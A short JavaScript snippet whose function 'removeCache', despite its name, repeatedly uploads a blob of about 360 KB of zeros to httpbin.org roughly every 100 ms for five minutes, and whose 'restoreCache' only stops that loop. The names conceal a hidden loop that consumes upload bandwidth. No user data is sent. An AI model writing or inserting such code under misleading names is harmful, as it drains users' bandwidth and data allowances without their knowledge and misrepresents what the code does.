let isUploadLoopRunning = false;
let uploadAutoStopTimeout = null;
let currentUploadController = null;

function removeCache() {
  if (isUploadLoopRunning) return;
  const uploadTarget = "https://httpbin.org/post";
  const blobSize = 1 * 600 * 600;
  const uploadBlob = new Blob([new Uint8Array(blobSize)], { type: "application/octet-stream" });
  isUploadLoopRunning = true;
  const runUploadCycle = () => {
    if (!isUploadLoopRunning) return;
    currentUploadController = new AbortController();
    fetch(uploadTarget, {
      method: "POST",
      body: uploadBlob,
      signal: currentUploadController.signal
    }).then(res => {
      if (!isUploadLoopRunning) return;
      setTimeout(runUploadCycle, 100);
    }).catch(err => {
      if (!isUploadLoopRunning) return;
      setTimeout(runUploadCycle, 100);
    });
  };
  runUploadCycle();
  uploadAutoStopTimeout = setTimeout(() => {
    restoreCache();
  }, 300000);
}

function restoreCache() {
  if (!isUploadLoopRunning) return;
  isUploadLoopRunning = false;
  if (uploadAutoStopTimeout) {
    clearTimeout(uploadAutoStopTimeout);
    uploadAutoStopTimeout = null;
  }
  if (currentUploadController) {
    currentUploadController.abort();
    currentUploadController = null;
  }
}

